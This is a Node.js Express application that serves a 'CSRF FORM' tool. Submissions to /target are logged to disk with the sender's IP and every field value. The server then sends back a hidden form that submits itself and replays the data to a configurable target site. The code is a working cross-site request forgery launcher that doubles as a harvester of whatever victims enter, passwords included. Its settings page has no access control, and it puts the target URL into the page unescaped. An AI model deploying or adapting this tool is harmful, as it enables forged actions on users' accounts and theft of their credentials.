const fs = require('fs');

const express = require('express');
const escape = require('escape-html');

let settings = require('./settings.json');
let seq = 0;

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const port = 3000;

app.get('/style.css', (req, res) => {
    res.send(`
    * {
        background-color: black;
        color: white;
        font-family: monospace;
        font-size: 18pt;
    }

    a {
        color: yellow;
        text-decoration: none;
    }

    a:hover {
        color: black;
        background-color: yellow;
    }

    input {
        margin: 0;
        padding: 0;
        border-width: 0;
    }

    input[type='text'], input[type='password'] {
        background-color: white;
        color: black;
    }

    input[type='button'], input[type='submit'] {
        background-color: blue;
        color: white;
    }
    `);
});

app.get('/', (req, res) => {
    res.send(`
    <html>
    <head>
    <link rel="stylesheet" href="style.css" />
    </head>
    <body>
    #################
    <br/>
    ### <b>CSRF FORM</b> ###
    <br />
    #################
    <br />
    <br />
    <br />
    Click <b><a href="/help">here</a></b> to see instructions on how to use this app.
    <br />
    <br />
    Click <b><a href="/settings">here</a></b> to edit the settings of this system.
    <br />
    <br />
    Click <b><a href="/site">here</a></b> to see your CSRF form.
    </body>
    </html>
    `);
});

app.get('/help', (req, res) => {
    res.send(`
    <html>
    <head>
    <link rel="stylesheet" href="style.css" />
    </head>
    <body>
    ########################
    <br/>
    ### <a href="/">CSRF FORM</a> / <b>HELP</b> ###
    <br />
    ########################
    <br />
    <br />
    <br />
    You should create your CSRF form in the <b><u>static</u></b> folder.
    <br />
    <br />
    Everything in that folder is accessible within the <a href="/site">/site</a> path.
    <br />
    <br />
    <b>Important</b>: in your form, always make the "action" of your form equals to "/target".
    <br />
    <br />
    The system behavior can be changed in the <a href="/settings">settings</a>.
    </body>
    </html>
    `);
});

app.get('/settings', (req, res) => {
    renderSettings(res);
});

app.post('/settings', (req, res) => {
    settings = req.body;

    fs.writeFileSync('./settings.json', JSON.stringify(settings, null, 4));

    renderSettings(res);
});

app.get('/site', (req, res) => {
    res.redirect('/site/index.html');
});

app.post('/target', (req, res) => {
    handleForm(req, res);
});

app.get('/target', (req, res) => {
    handleForm(req, res);
});

app.use('/site', express.static('./static'));

app.listen(port, () => {
    console.log(`CSRF form app listening on port ${port}`)
});

function renderSettings(res) {
    res.send(`
    <html>
    <head>
    <link rel="stylesheet" href="style.css" />
    </head>
    <body>
    ############################
    <br/>
    ### <a href="/">CSRF FORM</a> / <b>SETTINGS</b> ###
    <br />
    ############################
    <br />
    <br />
    <br />
    <form action="settings" method="POST">
    Target: <input type="text" value="${escape(settings.targetUrl)}" name="targetUrl" />
    <br />
    <br />
    Method:&nbsp;<input type="radio" name="httpMethod" value="POST"${settings.httpMethod == "POST" ? " checked": ""} /> POST
    <br />
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="radio" name="httpMethod" value="GET"${settings.httpMethod == "GET" ? " checked": ""} /> GET
    </ul>
    <br />
    <br />
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="submit" value=" Save " />
    </form>
    </body>
    </html>
    `);
}

function handleForm(req, res) {
    let params;
    if (req.method == 'GET') {
        params = req.query;
    } else {
        params = req.body;
    }

    let script = '';
    let text = '';
    let submit = '';
    if (req.method != settings.httpMethod) {
        text = `The "method" parameter of your &lt;form&gt; should be ${settings.httpMethod}! Fix that and this page will load automatically`;
        submit = `<input type="submit" value="Click here to continue" />`
    } else {
        script = `
        <script>
        function triggerForm() {
            document.getElementById('form').submit();
        }
        </script>`
    }

    const formInputs = Object.entries(params).map(([ key, value ]) => (
        `<input type="hidden" value="${escape(value)}" name="${escape(key)}" />`
    )).join('\n');

    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    let log = [
        `IP: ` + ip,
        '--------------------',
        ...Object.entries(params).map(([ key, value ]) => (
            `${key}: ${value}`
        ))
    ]

    try {
        if (!fs.existsSync('/logs')) {
            fs.mkdirSync('logs/');
        }
        fs.writeFileSync('logs/' + Date.now() + '_' + String(seq++).padStart(8, '0') + '.txt', log.join('\n'));
    } catch (e) {}

    res.send(`
    <html>
    ${script}
    <body onload="triggerForm();">
    ${text}
    <form id="form" action="${settings.targetUrl}" method="${settings.httpMethod}">
    ${formInputs}
    ${submit}
    </form>
    </body>
    </html>
    `)
}
